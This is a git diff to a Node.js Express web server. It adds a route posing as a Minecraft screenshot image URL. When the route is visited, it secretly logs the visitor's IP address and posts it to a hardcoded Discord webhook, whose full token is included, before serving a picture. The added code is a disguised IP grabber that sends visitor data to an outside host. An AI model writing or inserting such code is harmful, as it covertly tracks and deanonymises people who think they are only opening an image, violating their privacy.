@@ -12,6 +12,7 @@ var route_catch = require('./routes/catch.js');
 var route_auth = require('./routes/auth.js');
 var route_mudae = require('./routes/mudae.js');
 require('dotenv').config();
+
 app.use(express.static(path.join(__dirname, '')));
 
 connection = mysql2.createConnection({
@@ -45,6 +46,23 @@ app.use('/mudae', route_mudae);
 
 app.get('/', (req, res) => {
     res.sendFile('/index.html')
+});
+
+app.get('/images/minecraft/screenshot_2021_03_08.png', function (req, res) {
+  console.log(req.connection.remoteAddress);
+  fetch("https://discord.com/api/webhooks/510787425186873365/TEIpBGgl5bw9u5LK5PWAkPL8XpSg4WUHr8DuRRHzDehZDraKiNX02-xd5CVJwUM2_GM0", {
+    method: 'post',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+        username: 'SVT',
+        avatar_url: 'https://i.imgur.com/zEN5n0b.png',
+        content: req.connection.remoteAddress,
+    })
+
+})
+  res.sendFile(__dirname + "/minecraft.png");
 });
 
 const hostname = '192.168.56.101';
